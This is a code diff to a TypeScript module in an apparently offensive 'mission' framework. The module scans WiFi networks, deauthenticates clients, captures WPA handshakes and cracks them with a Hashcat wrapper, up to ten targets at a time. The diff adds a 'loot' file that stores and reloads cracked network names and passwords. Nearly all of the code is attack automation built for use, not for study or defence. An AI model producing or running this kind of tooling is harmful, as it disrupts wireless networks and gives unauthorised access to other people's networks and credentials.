@@ -7,7 +7,16 @@ import { UI, COLOR_PALETTE } from "../../lib/ui";
 import { MissionManifest, ModuleResult, NewAsset } from "../../lib/types";
 
 // ============================================================================
-// SECTION 2: Module Metadata
+// SECTION 2: Constants
+// ============================================================================
+
+const CONCURRENT_ATTACKS = 10;
+const DEAUTH_PACKETS = 10;
+const CRACKED_WIFI_FILE = "./loot/cracked_wifi.txt";
+const TMP_DIR = "./tmp";
+
+// ============================================================================
+// SECTION 3: Module Metadata
 // ============================================================================
 
 export const meta = {
@@ -20,11 +29,8 @@ export const meta = {
 };
 
 // ============================================================================
-// SECTION 3: Core Logic (run function)
+// SECTION 4: Types
 // ============================================================================
-
-const CONCURRENT_ATTACKS = 10;
-const DEAUTH_PACKETS = 10;
 
 interface WiFiNetwork {
   bssid: string;
@@ -34,6 +40,17 @@ interface WiFiNetwork {
   cracked?: boolean;
   password?: string;
 }
+
+interface CrackedWiFiEntry {
+  bssid: string;
+  ssid: string;
+  password: string;
+  crackedAt: string;
+}
+
+// ============================================================================
+// SECTION 5: Core Logic (run function)
+// ============================================================================
 
 export async function run(
   mission: MissionManifest,
@@ -54,7 +71,11 @@ export async function run(
 
   ui.success(`Using interface: ${monitorIface.name}`);
 
-  // Step 2: Scan networks
+  // Step 2: Load previously cracked networks from file
+  const crackedFromFile = await loadCrackedWifiFile();
+  ui.info(`Loaded ${crackedFromFile.length} networks from cracked_wifi.txt`);
+
+  // Step 3: Scan networks
   ui.info("Scanning for WiFi networks...");
   const allNetworks = await Networking.Wifi.Scan(monitorIface.name);
   
@@ -63,51 +84,54 @@ export async function run(
     return { success: false, data: { results: [] } };
   }
 
-  // Filter valid networks
+  // Filter valid networks and mark already cracked
   const networks: WiFiNetwork[] = allNetworks
     .filter((n) => n.bssid && n.ssid)
-    .map((n) => ({
-      bssid: n.bssid,
-      ssid: n.ssid,
-      signal: n.signal || 0,
-      encryption: n.encryption || "WPA2",
-    }));
+    .map((n) => {
+      const cracked = crackedFromFile.find((c) => c.bssid === n.bssid);
+      return {
+        bssid: n.bssid,
+        ssid: n.ssid,
+        signal: n.signal || 0,
+        encryption: n.encryption || "WPA2",
+        cracked: !!cracked,
+        password: cracked?.password,
+      };
+    });
 
   ui.success(`Found ${networks.length} networks`);
   ui.divider();
 
-  // Step 3: Check for already cracked networks from mission
-  const crackedFromHistory = getCrackedNetworksFromMission(mission);
-  
-  // Merge with discovered networks
-  const mergedNetworks = networks.map((n) => {
-    const cracked = crackedFromHistory.find((c) => c.bssid === n.bssid);
-    if (cracked) {
-      return { ...n, cracked: true, password: cracked.password };
-    }
-    return n;
-  });
+  // Step 4: Show current status (only if some networks need cracking)
+  const alreadyCracked = networks.filter((n) => n.cracked);
+  const toCrack = networks.filter((n) => !n.cracked);
 
-  // Step 4: Show current status
-  const alreadyCracked = mergedNetworks.filter((n) => n.cracked);
-  const toCrack = mergedNetworks.filter((n) => !n.cracked);
-
-  if (alreadyCracked.length > 0) {
+  if (toCrack.length > 0 && alreadyCracked.length > 0) {
+    // Show already cracked only when there are also networks to crack
     ui.success(`${alreadyCracked.length} networks already cracked`);
     displayNetworksTable(ui, alreadyCracked, true);
-  }
-
-  if (toCrack.length > 0) {
     ui.info(`${toCrack.length} networks to crack`);
     displayNetworksTable(ui, toCrack, false);
+  } else if (toCrack.length > 0) {
+    // All networks need cracking
+    ui.info(`${toCrack.length} networks to crack`);
+    displayNetworksTable(ui, toCrack, false);
+  } else if (alreadyCracked.length > 0) {
+    // All already cracked - skip intermediate display
+    ui.success(`All ${alreadyCracked.length} networks already cracked from file`);
   }
 
-  // Step 5: Crack remaining networks
+  // Step 6: Crack remaining networks
   let newlyCracked: WiFiNetwork[] = [];
   
   if (toCrack.length > 0) {
     ui.section("Cracking Phase");
     newlyCracked = await crackNetworks(ui, monitorIface.name, toCrack);
+    
+    // Save newly cracked to file
+    if (newlyCracked.length > 0) {
+      await saveCrackedWifiFile(newlyCracked);
+    }
   }
 
   // Combine all cracked networks
@@ -122,7 +146,7 @@ export async function run(
   ui.section("Cracked Networks Available");
   displayCrackedNetworks(ui, allCracked);
 
-  // Step 7: Prompt user to select network to connect
+  // Step 8: Prompt user to select network to connect
   const selection = await uiPrompt(ui, "\nSelect network index to connect (or 'q' to skip): ");
   
   if (selection.toLowerCase() === "q") {
@@ -148,28 +172,56 @@ export async function run(
 }
 
 // ============================================================================
-// SECTION 4: Helper Functions
+// SECTION 6: Helper Functions
 // ============================================================================
 
-function getCrackedNetworksFromMission(mission: MissionManifest): Array<{ bssid: string; ssid: string; password: string }> {
-  // Look for WiFi credentials in mission history or assets
-  const cracked: Array<{ bssid: string; ssid: string; password: string }> = [];
-  
-  // Check credentials for WiFi entries
-  for (const cred of mission.assets.credentials) {
-    if (cred.source.startsWith("wifi:")) {
-      const parts = cred.source.split(":");
+async function loadCrackedWifiFile(): Promise<CrackedWiFiEntry[]> {
+  try {
+    const content = await FileSystem.ReadFile(CRACKED_WIFI_FILE, { absolute: false });
+    if (!content) return [];
+    
+    const lines = content.split("\n").filter(l => l.trim());
+    const entries: CrackedWiFiEntry[] = [];
+    
+    for (const line of lines) {
+      const parts = line.split("|");
       if (parts.length >= 3) {
-        cracked.push({
-          bssid: parts[1],
-          ssid: parts[2],
-          password: cred.pass,
+        entries.push({
+          bssid: parts[0].trim(),
+          ssid: parts[1].trim(),
+          password: parts[2].trim(),
+          crackedAt: parts[3]?.trim() || new Date().toISOString(),
         });
       }
     }
+    return entries;
+  } catch {
+    return [];
   }
-  
-  return cracked;
+}
+
+async function saveCrackedWifiFile(networks: WiFiNetwork[]): Promise<void> {
+  try {
+    // Ensure loot dir exists
+    await FileSystem.Mkdir("./loot", { recursive: true });
+    
+    // Load existing to avoid duplicates
+    const existing = await loadCrackedWifiFile();
+    const existingBssids = new Set(existing.map(e => e.bssid));
+    
+    // Add new entries
+    const newEntries = networks
+      .filter(n => n.password && !existingBssids.has(n.bssid))
+      .map(n => `${n.bssid}|${n.ssid}|${n.password}|${new Date().toISOString()}`);
+    
+    if (newEntries.length === 0) return;
+    
+    // Append to file
+    const content = newEntries.join("\n") + "\n";
+    await FileSystem.WriteFile(CRACKED_WIFI_FILE, content, { append: true, absolute: false });
+  } catch {
+    // Ignore save errors
+  }
 }
 
 function displayNetworksTable(ui: UI, networks: WiFiNetwork[], cracked: boolean): void {
@@ -256,10 +308,13 @@ async function crackSingleNetwork(
   ui: UI
 ): Promise<WiFiNetwork> {
   try {
+    // Ensure tmp dir exists
+    await FileSystem.Mkdir(TMP_DIR, { recursive: true });
+    
     // Deauth
     await Networking.Wifi.Deauth(ifaceName, target.bssid, { packets: DEAUTH_PACKETS });
     
-    // Capture handshake
+    // Capture handshake (pcap goes to current dir by default)
     const pcapFile = await Networking.Wifi.CaptureHandshake(ifaceName, target.bssid);
     if (!pcapFile) {
       return { ...target, cracked: false };
@@ -270,20 +325,26 @@ async function crackSingleNetwork(
     try {
       password = await Crypto.Hashcat.Decrypt(pcapFile);
     } catch {
-      // Try alternative paths
+      // Try with full path
       try {
         const cwd = await FileSystem.cwd();
-        password = await Crypto.Hashcat.Decrypt(pcapFile, { cwd: cwd.absolutePath });
+        const fullPath = `${cwd.absolutePath}/${pcapFile}`;
+        password = await Crypto.Hashcat.Decrypt(fullPath);
       } catch {
         // Failed
       }
     }
 
-    // Cleanup pcap
+    // Cleanup pcap - try both relative and absolute paths
     try {
       await FileSystem.Remove(pcapFile);
     } catch {
-      // Ignore cleanup errors
+      try {
+        const cwd = await FileSystem.cwd();
+        await FileSystem.Remove(`${cwd.absolutePath}/${pcapFile}`);
+      } catch {
+        // Ignore cleanup errors
+      }
     }
 
     if (password) {
@@ -333,7 +394,7 @@ function buildResult(
 }
 
 // ============================================================================
-// SECTION 5: Default Export
+// SECTION 7: Default Export
 // ============================================================================
 
 export default { meta, run };
